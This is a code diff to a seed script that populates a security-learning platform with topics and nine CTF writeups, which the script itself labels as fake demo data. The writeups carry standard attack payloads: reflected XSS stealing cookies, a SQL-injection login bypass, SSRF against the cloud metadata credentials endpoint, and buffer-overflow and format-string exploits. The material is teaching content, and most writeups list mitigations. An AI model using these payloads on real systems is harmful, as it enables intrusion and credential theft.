@@ -11,6 +11,8 @@ import { Achievement } from '../src/models/Achievement';
 import { Interview }   from '../src/models/Interview';
 import { Company }     from '../src/models/Company';
 import { Roadmap }     from '../src/models/Roadmap';
+import { Topic }       from '../src/models/Topic';
+import { Article }     from '../src/models/Article';
 
 dotenv.config();
 
@@ -718,6 +720,410 @@ const ROADMAPS = [
   },
 ];
 
+// ─── CTF Topics & Articles (fake demo data) ──────────────────────────────────
+// NOTE: All CTF writeup articles below are FAKE / synthetic demo data created
+// solely to demonstrate the platform UI. They are NOT real challenge solutions
+// or security advisories.
+
+const SYSTEM_UID  = 'seed-script';
+const SYSTEM_NAME = 'CysKH Demo Bot';
+
+const CTF_TOPICS = [
+  { slug: 'web-exploitation',    title: 'Web Exploitation',   description: 'XSS, SQLi, SSRF, CSRF, broken auth and other web-layer attack techniques.', type: 'ctf' as const, order: 1, createdBy: SYSTEM_UID },
+  { slug: 'reverse-engineering', title: 'Reverse Engineering', description: 'Binary analysis, disassembly, decompilation and patch-diffing challenges.',  type: 'ctf' as const, order: 2, createdBy: SYSTEM_UID },
+  { slug: 'cryptography',        title: 'Cryptography',        description: 'Classical ciphers, AES modes, RSA, elliptic curves and side-channel attacks.', type: 'ctf' as const, order: 3, createdBy: SYSTEM_UID },
+  { slug: 'binary-exploitation', title: 'Binary Exploitation', description: 'Buffer overflows, format strings, heap exploitation and ROP chains.',          type: 'ctf' as const, order: 4, createdBy: SYSTEM_UID },
+];
+
+function buildCTFArticles(topicMap: Record<string, mongoose.Types.ObjectId>) {
+  const web = topicMap['web-exploitation'];
+  const rev = topicMap['reverse-engineering'];
+  const cry = topicMap['cryptography'];
+  const pwn = topicMap['binary-exploitation'];
+  const now = new Date();
+
+  const raw = [
+    // ── Web Exploitation ─────────────────────────────────────────────────
+    {
+      topicId: web, order: 1,
+      title: 'Reflected XSS via URL Parameter — PicoCTF Web 100',
+      tags: ['xss', 'web', 'picoctf'],
+      content: [
+        '> ⚠️ **Fake demo writeup.** Synthetic data created to populate the platform UI. Not a real CTF solution.',
+        '',
+        '## Challenge Overview',
+        '',
+        'A web app echoes a `?name=` query parameter directly into the page source without sanitisation, enabling reflected XSS.',
+        '',
+        '## Reconnaissance',
+        '',
+        'Browsing to `/welcome?name=Alice` renders:',
+        '',
+        '```html',
+        '<h1>Hello, Alice!</h1>',
+        '```',
+        '',
+        'No encoding applied. The value lands raw inside an HTML tag.',
+        '',
+        '## Exploitation',
+        '',
+        'Inject a script payload:',
+        '',
+        '```',
+        '/welcome?name=<script>alert(document.cookie)</script>',
+        '```',
+        '',
+        '## Flag',
+        '',
+        '```',
+        'picoCTF{r3fl3ct3d_xss_1s_3asy_abc123}',
+        '```',
+        '',
+        '## Mitigation',
+        '',
+        '- HTML-encode all user-supplied output.',
+        '- Set `Content-Security-Policy` headers to restrict inline scripts.',
+        '- Use `HttpOnly` and `Secure` flags on session cookies.',
+      ].join('\n'),
+    },
+    {
+      topicId: web, order: 2,
+      title: 'SQL Injection Auth Bypass — CTFLearn Database Backdoor',
+      tags: ['sqli', 'web', 'auth-bypass'],
+      content: [
+        '> ⚠️ **Fake demo writeup.** Synthetic data created to populate the platform UI. Not a real CTF solution.',
+        '',
+        '## Challenge Overview',
+        '',
+        'A login form passes user input directly into a MySQL `SELECT` query with no parameterisation.',
+        '',
+        '## Source Snippet (leaked via `/robots.txt`)',
+        '',
+        '```php',
+        '$query = "SELECT * FROM users WHERE username=\'$user\' AND password=\'$pass\'";',
+        '```',
+        '',
+        '## Payload',
+        '',
+        'Username: `admin\' -- -`',
+        '',
+        'Resulting query:',
+        '',
+        '```sql',
+        "SELECT * FROM users WHERE username='admin' -- -' AND password='anything'",
+        '```',
+        '',
+        'The `-- -` comments out the password check.',
+        '',
+        '## Flag',
+        '',
+        '```',
+        'CTF{sql_1nj3ct10n_byp4ss_f0r_th3_w1n}',
+        '```',
+        '',
+        '## Mitigation',
+        '',
+        '- Use prepared statements / parameterised queries.',
+        '- Employ an ORM with automatic escaping.',
+        '- Least-privilege DB accounts — never `root` for the web app.',
+      ].join('\n'),
+    },
+    {
+      topicId: web, order: 3,
+      title: 'SSRF to Internal Metadata Service — HackTheBox Web Challenge',
+      tags: ['ssrf', 'web', 'cloud'],
+      content: [
+        '> ⚠️ **Fake demo writeup.** Synthetic data created to populate the platform UI. Not a real CTF solution.',
+        '',
+        '## Challenge Overview',
+        '',
+        'A URL-fetching feature accepts arbitrary URLs, enabling SSRF against the AWS EC2 Instance Metadata Service.',
+        '',
+        '## Discovery',
+        '',
+        '```json',
+        'POST /fetch',
+        '{ "url": "https://example.com/image.png" }',
+        '```',
+        '',
+        '## Exploit',
+        '',
+        '```json',
+        '{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }',
+        '```',
+        '',
+        'Response reveals the IAM role name. A second request fetches temporary AWS credentials.',
+        '',
+        '## Flag',
+        '',
+        '```',
+        'HTB{ssrf_t0_m3tadata_s3rv1c3_pwn3d}',
+        '```',
+        '',
+        '## Mitigation',
+        '',
+        '- Block requests to RFC-1918 and link-local ranges at the app layer.',
+        '- Enforce IMDSv2 (token-required) on all EC2 instances.',
+        '- Use an allowlist of permitted external domains.',
+      ].join('\n'),
+    },
+
+    // ── Reverse Engineering ──────────────────────────────────────────────
+    {
+      topicId: rev, order: 1,
+      title: 'Cracking a Simple License Check with Ghidra — PicoCTF Reversing',
+      tags: ['ghidra', 'reversing', 'picoctf'],
+      content: [
+        '> ⚠️ **Fake demo writeup.** Synthetic data created to populate the platform UI. Not a real CTF solution.',
+        '',
+        '## Challenge Overview',
+        '',
+        'A 64-bit ELF binary checks a command-line argument against a hardcoded key using `strcmp`.',
+        '',
+        '## Static Analysis (Ghidra)',
+        '',
+        '```c',
+        'if (strcmp(argv[1], "s3cr3t_k3y_2024") == 0) {',
+        '    puts("Correct! Flag: picoCTF{r3v_1s_fun_xyz789}");',
+        '} else {',
+        '    puts("Wrong key.");',
+        '}',
+        '```',
+        '',
+        'The key is in plaintext — no obfuscation.',
+        '',
+        '## Flag',
+        '',
+        '```',
+        'picoCTF{r3v_1s_fun_xyz789}',
+        '```',
+        '',
+        '## Takeaways',
+        '',
+        '- Never store secrets in compiled binaries.',
+        '- Basic static analysis exposes hardcoded strings instantly.',
+        '- Obfuscation/packing only raises the bar, not prevents analysis.',
+      ].join('\n'),
+    },
+    {
+      topicId: rev, order: 2,
+      title: 'Unpacking a UPX-Compressed Binary — CTF 2025',
+      tags: ['upx', 'packing', 'reversing'],
+      content: [
+        '> ⚠️ **Fake demo writeup.** Synthetic data created to populate the platform UI. Not a real CTF solution.',
+        '',
+        '## Challenge Overview',
+        '',
+        'The binary immediately exits in a debugger — telltale signs of packing.',
+        '',
+        '## Identification',
+        '',
+        '```bash',
+        '$ file challenge',
+        'challenge: ELF 64-bit, UPX compressed',
+        '$ strings challenge | grep UPX',
+        'UPX!',
+        '```',
+        '',
+        '## Unpacking',
+        '',
+        '```bash',
+        '$ upx -d challenge -o challenge_unpacked',
+        '```',
+        '',
+        'Analyse the unpacked binary in Ghidra to locate the flag comparison routine.',
+        '',
+        '## Flag',
+        '',
+        '```',
+        'FLAG{upx_1s_n0t_0bfusc4t10n}',
+        '```',
+        '',
+        '## Takeaways',
+        '',
+        '- Always run `file`, `strings`, and `binwalk` first.',
+        '- UPX is trivially reversible; real-world malware uses custom packers.',
+      ].join('\n'),
+    },
+
+    // ── Cryptography ────────────────────────────────────────────────────
+    {
+      topicId: cry, order: 1,
+      title: 'Breaking Caesar Cipher — PicoCTF Crypto Warmup',
+      tags: ['caesar', 'classical', 'crypto', 'picoctf'],
+      content: [
+        '> ⚠️ **Fake demo writeup.** Synthetic data created to populate the platform UI. Not a real CTF solution.',
+        '',
+        '## Challenge Overview',
+        '',
+        'Ciphertext provided with hint "ROT13 isn\'t always 13."',
+        '',
+        '## Ciphertext',
+        '',
+        '```',
+        'SBYYBJ GUR JUVGR ENOOBY',
+        '```',
+        '',
+        '## Brute Force',
+        '',
+        '```python',
+        'ct = "SBYYBJ GUR JUVGR ENOOBY"',
+        'for shift in range(26):',
+        '    pt = "".join(',
+        '        chr((ord(c) - ord("A") - shift) % 26 + ord("A")) if c.isalpha() else c',
+        '        for c in ct',
+        '    )',
+        '    print(shift, pt)',
+        '```',
+        '',
+        'Shift 13 yields: `FOLLOW THE WHITE RABBIT`.',
+        '',
+        '## Flag',
+        '',
+        '```',
+        'picoCTF{follow_the_white_rabbit}',
+        '```',
+      ].join('\n'),
+    },
+    {
+      topicId: cry, order: 2,
+      title: 'RSA Small Public Exponent Attack (e=3) — CryptoHack',
+      tags: ['rsa', 'small-exponent', 'cryptohack'],
+      content: [
+        '> ⚠️ **Fake demo writeup.** Synthetic data created to populate the platform UI. Not a real CTF solution.',
+        '',
+        '## Challenge Overview',
+        '',
+        'Server uses RSA with `e = 3` and a large modulus. The plaintext is short enough that `m³ < n`.',
+        '',
+        '## Key Insight',
+        '',
+        'If `e = 3` and `m` is small: `c = m³ mod n` simplifies to `c = m³` (no modular reduction).',
+        '',
+        'Recover `m` with an integer cube root:',
+        '',
+        '```python',
+        'import gmpy2',
+        'c = int(input("c = "))',
+        'm, exact = gmpy2.iroot(c, 3)',
+        'if exact:',
+        '    print(bytes.fromhex(hex(m)[2:]))',
+        '```',
+        '',
+        '## Flag',
+        '',
+        '```',
+        'cryptohack{sm4ll_3xp0n3nt_rsa_1s_w34k}',
+        '```',
+        '',
+        '## Mitigation',
+        '',
+        '- Use `e = 65537` — standard practice.',
+        '- Always use OAEP padding; never textbook RSA.',
+      ].join('\n'),
+    },
+
+    // ── Binary Exploitation ──────────────────────────────────────────────
+    {
+      topicId: pwn, order: 1,
+      title: 'Stack Buffer Overflow with ret2win — PicoCTF Pwn',
+      tags: ['bof', 'ret2win', 'pwn', 'picoctf'],
+      content: [
+        '> ⚠️ **Fake demo writeup.** Synthetic data created to populate the platform UI. Not a real CTF solution.',
+        '',
+        '## Challenge Overview',
+        '',
+        'A 32-bit binary reads user input into a 64-byte buffer via `gets`, enabling a stack overflow.',
+        '',
+        '## Checksec',
+        '',
+        '```',
+        'Arch:   i386-32-little',
+        'Stack:  No canary found',
+        'NX:     NX disabled',
+        'PIE:    No PIE',
+        '```',
+        '',
+        '## Finding the Offset',
+        '',
+        '```bash',
+        '$ python3 -c "import pwn; print(pwn.cyclic(200).decode())" | ./vuln',
+        '# EIP = 0x6161616c → offset 76',
+        '```',
+        '',
+        '## Exploit',
+        '',
+        '```python',
+        'from pwn import *',
+        'p = process("./vuln")',
+        'win_addr = p32(0x080491a2)',
+        'payload = b"A" * 76 + win_addr',
+        'p.sendline(payload)',
+        'p.interactive()',
+        '```',
+        '',
+        '## Flag',
+        '',
+        '```',
+        'picoCTF{ret2win_1s_just_the_b3g1nn1ng}',
+        '```',
+      ].join('\n'),
+    },
+    {
+      topicId: pwn, order: 2,
+      title: 'Format String Leak to Arbitrary Read — CTF 2025 Pwn',
+      tags: ['format-string', 'pwn', 'memory-leak'],
+      content: [
+        '> ⚠️ **Fake demo writeup.** Synthetic data created to populate the platform UI. Not a real CTF solution.',
+        '',
+        '## Challenge Overview',
+        '',
+        'A 64-bit binary calls `printf(user_input)` directly — classic format string vulnerability.',
+        '',
+        '## Vulnerability',
+        '',
+        '```c',
+        'char buf[256];',
+        'fgets(buf, 256, stdin);',
+        'printf(buf);   // ← unsanitised format string',
+        '```',
+        '',
+        '## Leaking Stack Values',
+        '',
+        'Send `%p.%p.%p.%p.%p.%p` to print the first six 8-byte stack slots.',
+        '',
+        'Use `%N$p` (direct parameter access) to pinpoint the canary offset:',
+        '',
+        '```python',
+        "payload = b'%15$p'  # canary is at position 15",
+        '```',
+        '',
+        '## Full Exploit Chain',
+        '',
+        '1. Leak canary with format string.',
+        '2. Overflow buffer to overwrite saved RIP.',
+        '3. Re-insert canary to bypass the check.',
+        '4. Return to win function.',
+        '',
+        '## Flag',
+        '',
+        '```',
+        'FLAG{f0rmat_str1ng_l3ak5_3v3ryth1ng}',
+        '```',
+      ].join('\n'),
+    },
+  ];
+
+  return raw.map((a, i) => ({
+    ...a,
+    slug:        a.title.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/(^-|-$)/g, '') + '-' + (Date.now() + i),
+    authorUid:   SYSTEM_UID,
+    authorName:  SYSTEM_NAME,
+    status:      'published' as const,
+    publishedAt: now,
+  }));
+}
+
 // ─── Main ─────────────────────────────────────────────────────────────────────
 
 async function main() {
@@ -746,6 +1152,26 @@ async function main() {
   await Roadmap.deleteMany({});
   await Roadmap.insertMany(ROADMAPS);
   console.log(`[seed-content] ✓ Roadmaps:      ${ROADMAPS.length} inserted`);
+
+  // CTF Topics & Articles (fake demo data)
+  const ctfSlugs = CTF_TOPICS.map((t) => t.slug);
+  // Delete any existing articles that belong to these topics (regardless of who created them)
+  const existingTopics = await Topic.find({ slug: { $in: ctfSlugs } }).select('_id');
+  const existingTopicIds = existingTopics.map((t) => t._id);
+  if (existingTopicIds.length > 0) {
+    await Article.deleteMany({ topicId: { $in: existingTopicIds } });
+  }
+  await Topic.deleteMany({ slug: { $in: ctfSlugs } });
+  const insertedTopics = await Topic.insertMany(CTF_TOPICS);
+  console.log(`[seed-content] ✓ CTF Topics:    ${insertedTopics.length} inserted`);
+
+  const topicMap: Record<string, mongoose.Types.ObjectId> = {};
+  for (const t of insertedTopics) topicMap[t.slug] = t._id as mongoose.Types.ObjectId;
+
+  const ctfArticles = buildCTFArticles(topicMap);
+  await Article.deleteMany({ authorUid: SYSTEM_UID });
+  await Article.insertMany(ctfArticles);
+  console.log(`[seed-content] ✓ CTF Articles:  ${ctfArticles.length} inserted`);
 
   await mongoose.disconnect();
   console.log('[seed-content] Done. Disconnected.');
